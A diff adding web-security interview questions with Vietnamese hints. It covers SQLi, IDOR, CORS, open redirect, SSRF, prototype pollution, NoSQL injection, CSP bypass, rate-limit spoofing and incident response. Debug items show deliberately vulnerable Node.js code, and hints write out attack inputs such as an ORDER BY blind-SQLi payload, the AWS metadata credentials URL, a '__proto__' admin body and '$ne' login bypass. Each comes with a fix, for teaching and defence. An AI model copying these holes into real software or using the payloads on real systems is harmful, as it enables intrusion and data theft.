+      - Log **sự kiện bảo mật**: login thành công/thất bại, đổi password/MFA, thay đổi quyền, truy cập bị từ chối (403), thao tác admin, export dữ liệu — kèm user id, tenant id, IP, user agent, correlation id.
+      - **Không log**: password, token/JWT, session id, API key, số thẻ, OTP, full body; PII tối thiểu (mask email/số điện thoại).
+      - Redaction ở **logger** (pino `redact` paths) chứ không trông vào từng dev; structured JSON.
+      - Log tamper-resistant (gửi ra hệ thống tập trung, quyền ghi riêng), retention theo compliance, **alert** trên pattern (A09:2025 nhấn mạnh alerting).
+      - Chống log injection (xuống dòng giả log entry) nhờ structured logging.
+    example: |-
+      ```ts
+      import pino from 'pino';
+      const logger = pino({
+        redact: { paths: ['req.headers.authorization', 'req.headers.cookie', '*.password', '*.token', '*.cardNumber'], censor: '[REDACTED]' },
+      });
+      ```
+    followUp: A user invokes GDPR's right to erasure. What happens to their data in your logs?
+    tags: [logging, pii, observability]
+  - id: web-security-026
+    level: medium
+    type: concept
+    q: What cookie attributes and prefixes do you use for a session cookie, and what does each protect against?
+    hint: |-
+      - `HttpOnly`: JS không đọc được → XSS không **đánh cắp** được cookie (vẫn gọi API được).
+      - `Secure`: chỉ gửi qua HTTPS.
+      - `SameSite=Lax` (hoặc Strict): giảm CSRF.
+      - `Path=/`, **không** đặt `Domain` → cookie chỉ gửi cho đúng host, không cho subdomain.
+      - Prefix `__Host-`: browser **ép** Secure + Path=/ + không Domain → subdomain không ghi đè được (chống cookie tossing). `__Secure-`: ép Secure.
+      - `Max-Age` hợp lý; xoay session id sau login (chống session fixation).
+    example: |-
+      ```text
+      Set-Cookie: __Host-sid=4f1c...; Path=/; Secure; HttpOnly; SameSite=Lax; Max-Age=28800
+      ```
+    followUp: Why must you regenerate the session ID after login?
+    tags: [cookies, session]
+  - id: web-security-027
+    level: medium
+    type: debug
+    q: This endpoint uses parameters for the search term but is still injectable. Where, and how do you fix it?
+    example: |-
+      ```ts
+      app.get('/products', async (req, res) => {
+        const { q, sort = 'created_at', dir = 'desc' } = req.query as Record<string, string>;
+        const rows = await knex.raw(
+          `SELECT id, name, price FROM products
+           WHERE tenant_id = ? AND name ILIKE ?
+           ORDER BY ${sort} ${dir} LIMIT 50`,
+          [req.tenantId, `%${q}%`],
+        );
+        res.json(rows.rows);
+      });
+      ```
+    hint: |-
+      `sort` và `dir` được **nội suy thẳng** vào SQL → `?sort=(CASE WHEN (SELECT substr(password_hash,1,1) FROM users LIMIT 1)='a' THEN price ELSE name END)` → blind SQLi, hoặc stacked query tuỳ driver.
+      Identifier không tham số hoá được → **allowlist**: `const SORTS = { created: 'created_at', price: 'price' } as const`, `dir` chỉ nhận `asc|desc`; hoặc dùng query builder `.orderBy(col, dir)` với giá trị đã allowlist.
+      Phụ: `ILIKE '%q%'` không dùng index → full scan (DoS); escape ký tự `%`/`_` trong `q` nếu muốn tìm literal; giới hạn độ dài `q`.
+    followUp: How do you catch this class of bug in code review or CI?
+    tags: [sql-injection, debug, knex]
+  - id: web-security-028
+    level: medium
+    type: debug
+    q: The route below passed code review because it has authentication. What's the vulnerability and the proper fix?
+    example: |-
+      ```ts
+      router.get('/api/orders/:id', requireAuth, async (req, res) => {
+        const order = await prisma.order.findUnique({ where: { id: req.params.id }, include: { address: true } });
+        if (!order) return res.status(404).end();
+        res.json(order);
+      });
+      ```
+    hint: |-
+      **IDOR/BOLA**: chỉ kiểm tra "đã đăng nhập", không kiểm tra order **thuộc về user/tenant** đó → đổi `:id` là xem đơn + địa chỉ (PII) của người khác.
+      Fix: scope query — `findFirst({ where: { id, tenantId: ctx.tenantId, customerId: ctx.userId } })` (hoặc policy: staff của tenant được xem mọi đơn trong tenant); trả **404** thay vì 403 để không xác nhận object tồn tại.
+      Cũng: `include: address` + trả nguyên entity → excessive data exposure; dùng response DTO.
+      Phòng tái diễn: helper `findOwnedOrThrow`, test tự động với 2 user khác tenant, RLS.
+    followUp: How do you write an automated test suite that catches BOLA across all endpoints?
+    tags: [idor, bola, debug]
+  - id: web-security-029
+    level: medium
+    type: debug
+    q: "A user became an admin by sending one request. Find the bug."
+    example: |-
+      ```ts
+      app.patch('/api/users/me', requireAuth, async (req, res) => {
+        const user = await prisma.user.update({
+          where: { id: req.user.id },
+          data: req.body,           // { "displayName": "Bob", "role": "ADMIN", "tenantId": "other" }
+        });
+        res.json(user);             // includes passwordHash, mfaSecret
+      });
+      ```
+    hint: |-
+      **Mass assignment**: `data: req.body` cho phép ghi mọi cột — `role`, `tenantId`, `emailVerified`. Response trả nguyên entity → lộ `passwordHash`, `mfaSecret` (BOPLA cả hai chiều).
+      Fix: schema allowlist (`z.object({ displayName, avatarUrl }).strict()`), map tường minh sang `data`, response DTO/Prisma `select` chỉ field public; thay đổi role đi qua endpoint admin riêng có check quyền + audit log.
+    followUp: How would you detect in logs that someone attempted this?
+    tags: [mass-assignment, debug, prisma]
+  - id: web-security-030
+    level: medium
+    type: debug
+    q: "The frontend team 'fixed' CORS errors with this config. What's the risk?"
+    example: |-
+      ```ts
+      app.use(cors({
+        origin: (origin, cb) => cb(null, origin),   // reflect any origin
+        credentials: true,
+      }));
+      // session is a cookie with SameSite=None; Secure
+      ```
+    hint: |-
+      Reflect mọi `Origin` + `credentials: true` = bất kỳ website nào cũng có thể `fetch('https://api.shop.com/me', { credentials: 'include' })` và **đọc** response bằng cookie của nạn nhân → lộ dữ liệu, đọc được CSRF token → vô hiệu hoá luôn CSRF defense. `SameSite=None` làm cookie được gửi cross-site.
+      Fix: allowlist origin chính xác (so khớp chuỗi đầy đủ, từ config), không cho `null`, thêm `Vary: Origin`; dùng `SameSite=Lax` nếu frontend cùng site; tách origin theo môi trường.
+    followUp: Frontend is on `app.shop.com` and API on `api.shop.com`. Do you even need `SameSite=None`?
+    tags: [cors, debug, csrf]
+  - id: web-security-031
+    level: medium
+    type: debug
+    q: What's wrong with this post-login redirect, and how would an attacker use it?
+    example: |-
+      ```ts
+      app.get('/login/callback', async (req, res) => {
+        await completeLogin(req, res);
+        const next = String(req.query.next ?? '/');
+        if (next.startsWith('/')) return res.redirect(next);
+        res.redirect('/');
+      });
+      ```
+    hint: |-
+      **Open redirect**: `startsWith('/')` cho qua `//evil.com` (protocol-relative) và `/\evil.com` (một số browser chuẩn hoá `\` thành `/`) → user đăng nhập trên domain thật rồi bị đưa sang trang phishing giống hệt ("phiên hết hạn, nhập lại password"). Kết hợp OAuth, open redirect còn có thể dùng để **rò authorization code/token** nếu redirect_uri validation lỏng.
+      Fix: parse bằng `new URL(next, APP_ORIGIN)` và yêu cầu `url.origin === APP_ORIGIN`, hoặc chỉ nhận **key** trong allowlist route; lưu `next` trong server session/state thay vì query.
+    followUp: How does an open redirect on your domain help an attacker bypass an OAuth provider's redirect URI check?
+    tags: [open-redirect, debug]
+  - id: web-security-032
+    level: medium
+    type: concept
+    q: What are the security risks of file upload features, and what controls do you put in place?
+    hint: |-
+      Rủi ro: upload file thực thi (webshell nếu server chạy file), **stored XSS** qua SVG/HTML phục vụ từ cùng origin, path traversal trong tên file (`../../`), zip bomb/decompression bomb, file quá lớn (DoS), malware phát tán cho user khác, XXE qua file XML/Office, metadata EXIF lộ vị trí.
+      Controls: giới hạn size + số lượng; validate **magic bytes** (không tin extension/Content-Type); tên file random (UUID), lưu ở object storage **không thực thi**; serve từ **domain riêng** (sandbox domain) với `Content-Disposition: attachment` + `nosniff`; scan AV async; re-encode ảnh (strip EXIF); authorization khi download.
+    followUp: Why serve user uploads from a separate domain rather than your main app domain?
+    tags: [file-upload]
+  - id: web-security-033
+    level: medium
+    type: concept
+    q: What is clickjacking and how do you prevent it? When do you legitimately need to allow framing?
+    hint: |-
+      Attacker nhúng trang của bạn trong iframe trong suốt trên trang của họ, lừa user bấm nút thật ("Xác nhận chuyển tiền", "Cấp quyền").
+      Phòng: CSP `frame-ancestors 'none'` (hoặc `'self'`, hoặc danh sách origin đối tác) — thay thế `X-Frame-Options: DENY` (vẫn có thể gửi kèm cho browser rất cũ). JS frame-busting không đáng tin.
+      Cần cho phép framing: widget thanh toán nhúng, embed dashboard cho tenant (B2B2C) → allowlist đúng origin của tenant, cookie `SameSite=None; Secure` (hoặc tốt hơn: token riêng cho embed), cân nhắc hạn chế thao tác nhạy cảm trong frame.
+    followUp: A tenant wants to embed your storefront in their own site. What breaks and what do you configure?
+    tags: [clickjacking, csp, headers]
+  - id: web-security-034
+    level: medium
+    type: compare
+    q: Input validation vs output encoding vs sanitization — which one prevents XSS, and why do you need all three?
+    hint: |-
+      - **Input validation** (allowlist schema: kiểu, độ dài, format) — giảm bề mặt tấn công, bảo vệ business logic; **không** chống XSS triệt để (tên "O'Brien <3" hợp lệ vẫn chứa ký tự đặc biệt).
+      - **Output encoding theo context** (HTML body, attribute, JS string, URL, CSS) — biện pháp **chính** chống XSS; framework template làm cho HTML body.
+      - **Sanitization** — khi **phải** cho phép HTML (rich text): DOMPurify/sanitize-html với allowlist tag/attribute.
+      Encode ở **lúc output** (biết context), không encode khi lưu (dữ liệu bị double-encode, dùng sai ở context khác như PDF/email/CSV).
+    followUp: What is CSV/formula injection, and which layer handles it?
+    tags: [xss, validation, encoding]
+  - id: web-security-035
+    level: hard
+    type: debug
+    q: "This 'link preview' feature was flagged in a pentest. Explain the attack and write a safer version."
+    example: |-
+      ```ts
+      app.post('/api/link-preview', requireAuth, async (req, res) => {
+        const { url } = req.body;
+        if (!/^https?:\/\//.test(url)) return res.status(400).end();
+        const r = await fetch(url, { redirect: 'follow' });
+        const html = await r.text();
+        res.json({ title: extractTitle(html), raw: html.slice(0, 2000) });
+      });
+      ```
+    hint: |-
+      **SSRF**: `http://169.254.169.254/latest/meta-data/iam/security-credentials/` (IMDSv1) → lộ credential AWS; `http://localhost:9200/_cat/indices`, `http://10.0.0.5:6379`; redirect từ domain hợp lệ sang IP nội bộ; DNS rebinding; `raw` trả nội dung → **full-read SSRF**.
+      Fix: resolve DNS → chặn private/loopback/link-local/ULA/IPv4-mapped IPv6; kết nối bằng **IP đã kiểm tra** (custom `lookup` trong agent), `redirect: 'manual'` + validate lại từng hop, chỉ port 80/443, timeout + giới hạn byte, không trả raw body, chạy trong subnet egress-only, IMDSv2 bắt buộc.
+    followUp: How does DNS rebinding bypass a "resolve and check" implementation that resolves twice?
+    tags: [ssrf, debug, cloud]
+  - id: web-security-036
+    level: hard
+    type: debug
+    q: A "deep merge" utility for user preferences led to every user suddenly having `isAdmin === true`. Explain.
+    example: |-
+      ```ts
+      function merge(target: any, src: any) {
+        for (const key in src) {
+          if (typeof src[key] === 'object' && src[key] !== null) {
+            target[key] ??= {};
+            merge(target[key], src[key]);
+          } else target[key] = src[key];
+        }
+        return target;
+      }
+      app.patch('/prefs', (req, res) => { merge(req.user.prefs, req.body); res.sendStatus(204); });
+      // body: {"__proto__": {"isAdmin": true}}
+      ```
+    hint: |-
+      **Prototype pollution**: `JSON.parse` tạo own property `__proto__`; `target['__proto__']` trỏ tới `Object.prototype` → ghi `isAdmin = true` lên prototype của **mọi object** trong process → check `if (user.isAdmin)` thành true cho tất cả, có thể dẫn tới RCE qua gadget (template engine, child_process options).
+      Fix: bỏ qua key `__proto__`, `constructor`, `prototype`; dùng `Object.create(null)`/`Map` cho dữ liệu động; validate body bằng schema strict; dùng thư viện đã vá; kiểm tra quyền bằng `Object.hasOwn` hoặc field tường minh; `--disable-proto=delete` (Node flag).
+    followUp: What is a prototype pollution "gadget", and why does pollution sometimes lead to RCE?
+    tags: [prototype-pollution, node, debug]
+  - id: web-security-037
+    level: hard
+    type: gotcha
+    q: "Your login uses MongoDB: `users.findOne({ email: req.body.email, password: hash(req.body.password) })`. An attacker logs in without a password. How, and what's the general lesson?"
+    hint: |-
+      **NoSQL injection**: body JSON cho phép **object** thay vì string: `{"email": {"$ne": null}, ...}` hoặc với code so sánh password plaintext `{"password": {"$ne": ""}}` → query operator khớp user đầu tiên (thường là admin).
+      Bài học: "không dùng SQL" ≠ không có injection. Validate **kiểu** input (zod `z.string().email()`), cast sang string, `mongo-sanitize`/`sanitizeFilter` (Mongoose `sanitizeFilter: true`), không đưa object client vào filter.
+      Cũng: tra user theo email rồi verify hash bằng hàm constant-time, không query theo password.
+    followUp: Can the same class of bug happen with an Elasticsearch query built from user input?
+    tags: [nosql-injection, mongodb, validation]
+  - id: web-security-038
+    level: hard
+    type: concept
+    q: What software supply chain attacks affect a Node.js project, and what concrete controls do you put in CI and in the repo?
+    hint: |-
+      Tấn công: **typosquatting**, account takeover của maintainer → publish bản độc (các vụ compromise npm hàng loạt năm 2025, worm tự lan qua token npm), `postinstall` script đánh cắp token/env, dependency confusion (tên package nội bộ trùng public), GitHub Action bị sửa tag, CI bị lộ secret.
+      Controls: commit **lockfile** + `npm ci`; review dependency mới (tuổi, maintainer, install scripts); tắt install scripts mặc định (`--ignore-scripts`, pnpm allowlist build scripts); scoped registry cho package nội bộ; Dependabot/Renovate có cooldown; `npm audit signatures`/provenance; pin action theo **commit SHA**; CI token quyền tối thiểu, trusted publishing (OIDC) thay token dài hạn; SBOM; tách secret khỏi job build PR từ fork.
+    followUp: A popular package you depend on was compromised two hours ago. What do you do right now?
+    verify: true
+    tags: [supply-chain, npm, ci]
+  - id: web-security-039
+    level: hard
+    type: scenario
+    q: You get an alert that an AWS access key belonging to your CI user was pushed to a public GitHub repo 40 minutes ago. Walk me through your response.
+    hint: |-
+      1. **Contain ngay**: deactivate/xoá access key (không chờ xoá commit); nếu có dấu hiệu dùng → revoke session tạm thời của role liên quan.
+      2. **Assess**: CloudTrail theo access key id — API nào bị gọi, từ IP nào, tạo user/key/role mới? EC2 lạ (crypto mining) ở region lạ? S3 GetObject hàng loạt?
+      3. **Eradicate**: xoá resource/credential attacker tạo, rotate secret mà key có quyền đọc (Secrets Manager), kiểm tra persistence (IAM user, Lambda, trust policy).
+      4. **Recover + communicate**: thông báo theo quy trình, xử lý data exposure (pháp lý nếu có PII).
+      5. **Prevent**: bỏ long-lived key → OIDC federation cho CI; push protection/secret scanning; least privilege; billing alert.
+    followUp: Why does deleting the commit from GitHub not end the incident?
+    tags: [scenario, incident-response, secrets, aws]
+  - id: web-security-040
+    level: hard
+    type: scenario
+    q: At 2 a.m. your login endpoint's failure rate jumps from 2% to 85% with 30k attempts per minute from thousands of IPs. What do you do tonight and this week?
+    hint: |-
+      **Credential stuffing**. Đêm nay: xác nhận (nhiều username khác nhau, ít lặp lại, user agent đồng dạng); bật challenge (CAPTCHA/proof-of-work) cho login theo rủi ro; rate limit theo ASN/IP range + global; chặn ở WAF/CDN bot management; đảm bảo không làm sập login của user thật; theo dõi số login **thành công** bất thường (tài khoản bị chiếm).
+      Tuần này: tài khoản đăng nhập thành công từ traffic tấn công → buộc reset password/revoke session, notify user; bật/khuyến khích MFA, passkey; breached-password check; device/IP anomaly detection; review response không lộ user tồn tại; postmortem.
+    followUp: How do you distinguish a legitimate success from an attacker success in that traffic?
+    tags: [scenario, credential-stuffing, incident-response]
+  - id: web-security-041
+    level: hard
+    type: scenario
+    q: A customer of tenant A reports seeing an order from tenant B in their order history. What do you do in the first hour, and how do you find the root cause?
+    hint: |-
+      Đây là **data breach** tiềm năng → xử lý như incident bảo mật, không phải bug thường.
+      Giờ đầu: xác minh (screenshot, request id); **contain** — tắt tính năng/endpoint nghi ngờ bằng feature flag, flush cache nghi ngờ; lưu bằng chứng (log, cache dump); báo security/legal (nghĩa vụ thông báo trong thời hạn luật định nếu PII bị lộ).
+      Root cause thường gặp: **cache key thiếu tenant**, query thiếu `tenant_id`, tenant context rò giữa request (biến module-level, request-scoped sai), job nền chạy không có tenant context, search index filter thiếu, CDN cache response có cookie.
+      Sau: xác định phạm vi (ai xem được gì, bao lâu) từ log; fix + test cross-tenant; defense-in-depth (RLS, cache key helper).
+    followUp: Your logs don't record which tenant's data was returned. How do you scope the impact?
+    tags: [scenario, multi-tenancy, incident-response]
+  - id: web-security-042
+    level: hard
+    type: scenario
+    q: Support forwards a ticket where a product review contains `<img src=x onerror=...>` and an admin's account was used to change payout settings. How do you respond and fix it properly?
+    hint: |-
+      Stored XSS chạy trong **admin panel** → attacker dùng phiên admin gọi API đổi payout.
+      Ngay: revert payout, khoá/xoá review độc, **revoke session** của admin (và mọi admin đã xem), kiểm tra audit log các hành động nhạy cảm, tìm payload tương tự trong DB.
+      Fix gốc: output encoding ở nơi render (admin thường render HTML "cho đẹp"), sanitize rich text bằng allowlist, **strict CSP** trên admin, hành động nhạy cảm (payout, đổi email) yêu cầu **re-authentication/step-up MFA**, admin panel ở origin riêng.
+      Bài học: admin tool thường ít được review bảo mật nhất nhưng quyền cao nhất.
+    followUp: Why does step-up authentication limit the damage of XSS even when CSP fails?
+    tags: [scenario, xss, admin]
+  - id: web-security-043
+    level: hard
+    type: concept
+    q: What is ReDoS, and what other "unrestricted resource consumption" issues do you check for in a Node.js API?
+    hint: |-
+      **ReDoS**: regex có backtracking thảm hoạ (`^(a+)+$`, validate email tự viết) với input xấu tốn thời gian mũ → block **event loop** → cả process ngừng phục vụ.
+      Khác: JSON body khổng lồ (thiếu `limit`), page size không giới hạn (`?limit=1000000`), GraphQL depth/complexity, upload không giới hạn, zip bomb, bcrypt/argon2 với password 1 MB, gọi API bên thứ ba tốn tiền (SMS, AI) không quota, `Array(n)` từ input.
+      Fix: timeout + limit ở mọi chiều, thư viện validator đã kiểm chứng, regex engine tuyến tính (RE2) cho pattern từ user, lint (`eslint-plugin-regexp`/safe-regex), rate limit + quota theo tenant.
+    example: |-
+      ```ts
+      const slow = /^(\w+\s?)*$/;
+      slow.test('a'.repeat(30) + '!'); // exponential backtracking, event loop blocked
+      ```
+    followUp: How would you find a ReDoS in production if the only symptom is event loop lag spikes?
+    tags: [redos, dos, node]
+  - id: web-security-044
+    level: hard
+    type: concept
+    q: Where do timing attacks matter in a web backend, and how do you avoid them?
+    hint: |-
+      So sánh secret bằng `===` dừng ở byte khác đầu tiên → thời gian phản hồi lộ tiền tố đúng (khó khai thác qua mạng nhưng khả thi với nhiều mẫu/same-DC).
+      Chỗ cần constant-time: webhook HMAC signature, API key, CSRF token, reset-password token, OTP → `crypto.timingSafeEqual` (buffer **cùng độ dài** — so sánh hash của hai giá trị để tránh throw).
+      Timing ở mức logic: login trả nhanh khi user không tồn tại (không hash) → **user enumeration** → vẫn chạy hash giả.
+      Tốt hơn nữa: lưu **hash** của token (như password) và tra theo hash.
+    example: |-
+      ```ts
+      import { createHmac, timingSafeEqual } from 'node:crypto';
+      function verifySignature(body: string, header: string, secret: string) {
+        const expected = createHmac('sha256', secret).update(body).digest();
+        const given = Buffer.from(header, 'hex');
+        return given.length === expected.length && timingSafeEqual(given, expected);
+      }
+      ```
+    followUp: Why should you store only a hash of password-reset tokens in the database?
+    tags: [timing-attack, cryptography]
+  - id: web-security-045
+    level: hard
+    type: concept
+    q: OWASP 2025 added "Mishandling of Exceptional Conditions". Give examples of fail-open bugs in Node.js services.
+    hint: |-
+      Hệ thống gặp lỗi và rơi vào trạng thái **kém an toàn** thay vì an toàn:
+      - Authorization service timeout → middleware `catch` rồi `next()` → cho qua.
+      - Rate limiter Redis lỗi → bỏ qua cho mọi endpoint, kể cả login/OTP.
+      - Lỗi verify webhook signature bị nuốt, vẫn xử lý payload.
+      - Transaction lỗi giữa chừng, không rollback → trừ tiền nhưng không tạo đơn; retry tạo bản ghi trùng.
+      - Stack trace/SQL error trả về client (lộ cấu trúc).
+      - Feature flag service down → default là bật tính năng beta cho mọi người.
+      Nguyên tắc: **deny by default** khi quyết định bảo mật không chắc chắn; xử lý lỗi tập trung; test đường lỗi (chaos/fault injection).
+    followUp: When is fail-open the right choice, and how do you make that decision explicit?
+    verify: true
+    tags: [owasp, error-handling, fail-open]
+  - id: web-security-046
+    level: hard
+    type: gotcha
+    q: Your rate limiter keys on `req.ip` in Express behind an AWS ALB. Attackers bypass it trivially. Why?
+    hint: |-
+      Hai hướng sai:
+      - Không set `trust proxy` → `req.ip` là IP của **load balancer** → mọi user chung một bucket (chặn nhầm cả hệ thống).
+      - Set `app.set('trust proxy', true)` → Express lấy IP **ngoài cùng bên trái** của `X-Forwarded-For` — giá trị **client tự gửi** → attacker đổi header mỗi request = bucket mới.
+      Đúng: trust đúng **số hop** proxy (`trust proxy = 1` cho một ALB) hoặc danh sách subnet proxy; key theo nhiều chiều (account, token, IP); với CDN phía trước dùng header CDN đã ký/khuyến nghị (và chặn truy cập trực tiếp origin).
+    example: |-
+      ```ts
+      app.set('trust proxy', true); // trusts client-supplied X-Forwarded-For
+      // curl -H 'X-Forwarded-For: 1.2.3.4' ... -> new rate-limit bucket every time
+      ```
+    followUp: How does IPv6 change IP-based rate limiting?
+    verify: true
+    tags: [rate-limiting, express, proxy]
+  - id: web-security-047
+    level: hard
+    type: concept
+    q: How do attackers bypass a CSP, and which directives close the common gaps?
+    hint: |-
+      Bypass phổ biến:
+      - Allowlist host có **JSONP**/endpoint phản chiếu callback, hoặc CDN công cộng chứa thư viện cũ (AngularJS template injection).
+      - `'unsafe-inline'`/`'unsafe-eval'` → gần như vô hiệu.
+      - Thiếu `base-uri` → inject `<base href>` đổi đích script tương đối.
+      - Thiếu `object-src 'none'` → plugin cũ.
+      - Nonce lặp lại (HTML cache) hoặc nonce bị reflect.
+      - Script gadget trong framework đọc attribute DOM (`data-*`) để thực thi.
+      - Dangling markup/exfiltration qua `img-src *`, form-action thiếu.
+      Đóng: strict CSP (nonce/hash + `strict-dynamic`), `base-uri 'none'`, `object-src 'none'`, `form-action 'self'`, **Trusted Types** (`require-trusted-types-for 'script'`) chặn DOM XSS sink.
+    followUp: What do Trusted Types enforce, and what does migrating a React app to them involve?
+    verify: true
+    tags: [csp, xss]
+  - id: web-security-048
+    level: hard
+    type: concept
+    q: Your product lets tenants write rich-text product descriptions shown on their storefronts. How do you allow formatting but prevent stored XSS?
+    hint: |-
+      - Lưu format an toàn: ưu tiên **structured format** (JSON của editor như ProseMirror/Lexical, hoặc Markdown không cho raw HTML) → render bằng component, không `innerHTML`.
+      - Nếu phải HTML: sanitize bằng **allowlist** (DOMPurify trên server với jsdom, hoặc sanitize-html) — tag (`p, strong, a, ul, img`), attribute (`href` chỉ http/https/mailto, `rel="noopener nofollow"`), bỏ `style`, `on*`, `iframe`, SVG.
+      - Sanitize **khi lưu** (để dữ liệu trong DB sạch) **và** khi render ở client nếu có thể (defense in depth); pin version sanitizer (có bypass mutation XSS theo phiên bản).
+      - CSP strict trên storefront; nội dung tenant nếu cho custom HTML/JS → sandbox domain riêng/iframe `sandbox`.
+    followUp: A tenant insists on embedding custom JavaScript (analytics). How do you support that safely?
+    tags: [xss, sanitization, multi-tenancy]
+  - id: web-security-049
+    level: hard
+    type: gotcha
+    q: A webhook endpoint verifies an HMAC signature, but attackers replay a legitimate "payment succeeded" webhook from last month. What was missing?
+    hint: |-
+      Chữ ký chỉ chứng minh **nguồn gốc + toàn vẹn**, không chứng minh **thời điểm/duy nhất**. Thiếu:
+      - **Timestamp** trong phần được ký + từ chối ngoài cửa sổ (vd 5 phút) — như Stripe `t=...,v1=...`.
+      - **Dedupe theo event id** (unique constraint) → xử lý idempotent.
+      - Xác minh trạng thái với provider (gọi API lấy payment theo id) cho event quan trọng, và kiểm tra event khớp đơn hàng/số tiền/tenant.
+      Cũng: verify trên **raw body** (không phải JSON đã parse lại), constant-time compare, hỗ trợ rotation 2 secret.
+    followUp: Why must signature verification use the raw request body in Express, and how do you get it?
+    tags: [webhooks, replay-attack, hmac]
+  - id: web-security-050
+    level: hard
+    type: concept
+    q: You encrypt customers' national ID numbers with AES-GCM using a key from KMS. Security asks for annual key rotation. How do you design it?
+    hint: |-
+      - **Envelope encryption**: mỗi bản ghi (hoặc mỗi tenant) có DEK; lưu `{ciphertext, iv, tag, encrypted_dek, key_version}`.
+      - Rotate **KEK** trong KMS: KMS giữ key version cũ để decrypt; chỉ cần **re-wrap DEK** (rẻ) — không cần giải mã lại toàn bộ dữ liệu.
+      - Rotate **DEK** (nếu yêu cầu): background job đọc–giải mã–mã hoá lại theo batch, idempotent theo `key_version`, đọc được cả version cũ trong lúc chạy.
+      - GCM: **IV không bao giờ lặp** với cùng key (random 96-bit, giới hạn số message/key); dùng AAD gắn `tenant_id`/`record_id` để chống tráo ciphertext giữa bản ghi.
+      - Access: chỉ service cần mới có quyền `kms:Decrypt`, audit CloudTrail.
+    followUp: What goes wrong if two records are encrypted with the same key and IV in GCM?
+    tags: [encryption, kms, key-rotation]
+  - id: web-security-051
+    level: senior
+    type: design
+    q: You're launching a public REST API for partners. Give me your security checklist, from the edge to the database.
+    hint: |-
+      - **Edge**: TLS 1.2+ only, HSTS, WAF, DDoS protection, request size limit.
+      - **AuthN**: OAuth 2.0 client credentials hoặc API key có scope + hash lưu DB + rotation; mTLS cho đối tác lớn.
+      - **AuthZ**: scope per endpoint (BFLA), object-level + tenant (BOLA), deny by default.
+      - **Input**: schema validation strict (OpenAPI/zod), giới hạn page size/array length, content-type check.
+      - **Output**: response DTO, không lộ internal id/stack trace, error format thống nhất.
+      - **Abuse**: rate limit + quota per client, idempotency key cho POST, business-flow protection.
+      - **Ops**: inventory API/version (API9), deprecation, audit log, alerting, secret scanning, dependency scanning, pentest trước launch.
+      - **Outbound**: webhook ký HMAC + timestamp, SSRF-safe.
+    followUp: Which three items would you refuse to launch without, and why?
+    tags: [api-security, checklist, design]
+  - id: web-security-052
+    level: senior
+    type: design
+    q: Threat-model the checkout flow of an e-commerce platform. What are the top threats and mitigations?
+    hint: |-
+      Dùng STRIDE hoặc "attacker goals":
+      - **Tampering giá**: client gửi `price`/`discount` → server tính lại mọi thứ từ catalog + promotion engine; snapshot giá.
+      - **Coupon/voucher abuse**: brute-force mã, dùng nhiều lần → rate limit, mã entropy cao, ràng buộc unique per user, race condition khi redeem (atomic).
+      - **IDOR** trên address/order/payment → scope theo user/tenant.
+      - **Payment**: webhook giả/replay → verify signature + timestamp + dedupe; số tiền/currency khớp order.
+      - **Bot/scalping** flash sale → bot management, queue, per-account limit.
+      - **Card testing** (dùng checkout để thử thẻ ăn cắp) → rate limit, 3DS, velocity rule.
+      - **Logging/PII**: không log PAN; dùng hosted fields/tokenization để ngoài PCI scope rộng.
+    followUp: How does using the PSP's hosted payment fields change your PCI DSS scope?
+    tags: [threat-modeling, checkout, payments]
+  - id: web-security-053
+    level: senior
+    type: open
+    q: How would you introduce security tooling (SAST, dependency scanning, DAST, secret scanning) into a team without drowning everyone in false positives?
+    hint: |-
+      - Bắt đầu từ thứ **tín hiệu cao, chi phí thấp**: secret scanning + push protection, dependency alert chỉ cho mức critical/high **có đường khai thác** (reachability), lockfile.
+      - Baseline: chấp nhận nợ hiện tại, **chặn cái mới** (fail PR chỉ khi finding mới).
+      - Tune rule, gắn owner, SLA theo severity; triage định kỳ, không để backlog vô hạn.
+      - Đưa security vào thiết kế: threat model nhẹ cho feature nhạy cảm (auth, payment, upload), checklist PR.
+      - Đo: thời gian fix critical, số secret bị chặn, tỷ lệ false positive.
+      Tín hiệu senior: cân bằng tốc độ và rủi ro, thuyết phục bằng dữ liệu.
+    followUp: A critical CVE lands in a transitive dependency with no fix available. What do you do?
+    tags: [devsecops, tooling, leadership]
+  - id: web-security-054
+    level: senior
+    type: open
+    q: Product wants to remove MFA from login because it hurts conversion. How do you handle this trade-off?
+    hint: |-
+      - Làm rõ mục tiêu và dữ liệu: MFA ở bước nào gây drop, loại user nào (buyer vs seller/admin).
+      - Phương án giữa: **risk-based/adaptive MFA** (chỉ khi thiết bị lạ, hành động nhạy cảm như đổi payout/email), **passkeys** (nhanh hơn password + OTP), "remember this device", step-up cho hành động giá trị cao.
+      - Phân tầng: bắt buộc cho admin/tenant owner/staff; tuỳ chọn cho buyer.
+      - Nêu rủi ro bằng tiền: account takeover → fraud, chargeback, support cost, uy tín.
+      - Quyết định có owner, ghi lại (risk acceptance), đo lại sau thay đổi.
+    followUp: How would you measure whether adaptive MFA is actually catching account takeovers?
+    tags: [mfa, product-tradeoff, judgment]
+  - id: web-security-055
+    level: senior
+    type: design
+    q: Design secrets management for 30 Node.js microservices on Kubernetes in AWS, including CI/CD and local development.
+    hint: |-
+      - **Không có secret nếu có thể**: IAM role per service (EKS Pod Identity/IRSA) cho AWS API; RDS IAM auth hoặc secret DB xoay tự động.
+      - Secret còn lại (API key bên thứ ba): **AWS Secrets Manager**/SSM, đồng bộ vào pod bằng External Secrets Operator hoặc CSI driver; KMS encryption; policy mỗi service chỉ đọc prefix của nó.
+      - Rotation: tự động (Lambda rotation), app reload không restart hoặc rolling restart; hỗ trợ 2 version song song.
+      - CI/CD: GitHub OIDC → assume role ngắn hạn, không long-lived key; secret không vào image/log; build PR từ fork không có secret.
+      - Local dev: secret riêng môi trường dev (không bao giờ prod), lấy qua CLI có SSO, `.env` trong `.gitignore` + pre-commit scan.
+      - Audit: CloudTrail truy cập secret, alert khi đọc bất thường.
+    followUp: How do you handle a third-party API key that the vendor can't rotate without a support ticket?
+    tags: [secrets, kubernetes, aws, design]
+  - id: web-security-056
+    level: senior
+    type: design
+    q: Design defense-in-depth for tenant data isolation in a shared-database SaaS so that a single developer mistake can't leak data across tenants.
+    hint: |-
+      Nhiều lớp độc lập:
+      1. **Tenant context** từ nguồn tin cậy (token/membership đã verify), lưu trong `AsyncLocalStorage`; không nhận `tenantId` từ body.
+      2. **Data access layer** tự thêm `tenant_id` (ORM extension/middleware); lint cấm raw query ngoài layer.
+      3. **DB**: Row-Level Security (Postgres `SET app.tenant_id` per transaction; SQL Server security policy + `SESSION_CONTEXT`), composite FK `(tenant_id, id)` để không tham chiếu chéo.
+      4. **Cache/search/storage**: key prefix, index filter bắt buộc (filtered alias), S3 prefix + IAM condition.
